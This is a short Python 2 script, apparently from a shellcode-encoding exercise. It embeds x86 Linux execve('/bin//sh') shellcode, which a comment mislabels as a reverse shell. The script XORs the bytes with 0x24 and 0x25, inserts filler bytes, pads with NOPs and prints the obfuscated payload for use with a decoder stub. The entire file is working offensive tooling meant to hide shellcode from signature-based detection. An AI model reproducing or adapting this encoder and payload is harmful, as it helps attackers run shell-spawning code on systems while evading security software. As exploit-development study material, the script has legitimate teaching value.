#!/usr/bin/python

# Placeholder shellcode (reverse shell).  Needs to have execve-stack shellcode. FYI: 25 bytes long
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

index = 1
# split shellcode into byte array
for byte in bytearray(shellcode):
	#print index(byte)
	if index % 5 == 0:
		y = byte^0x25
		encoded += '\\x'
		encoded += '%02x' % y  # see pyformat.info on use of % in formatting
		encoded += '\\x%02x' % 0x69	# insert 0x69 after every 5th byte

		encoded2 += '0x'
		encoded2 += '%02x,' % y
		encoded2 += '0x%02x,' % 0x69

	else:
		z = byte^0x24
		encoded += '\\x'
		encoded += '%02x' % z	# else XOR with 0x24

		encoded2 += '0x'
		encoded2 += '%02x,' % z

	index += 1

# Pad shellcode to reach a length divisible by 6
## each byte is technically 4 characters so divide len by 4 to get byte length
shellcode_length = len(encoded)/4
extra_instructions = shellcode_length % 6
if extra_instructions > 0:
	encoded += ('\\x%02x' % 0x90) * (6 - extra_instructions)
	encoded2 += ('0x%02x,' % 0x90) * (6 - extra_instructions)


print encoded
print " "
print encoded2


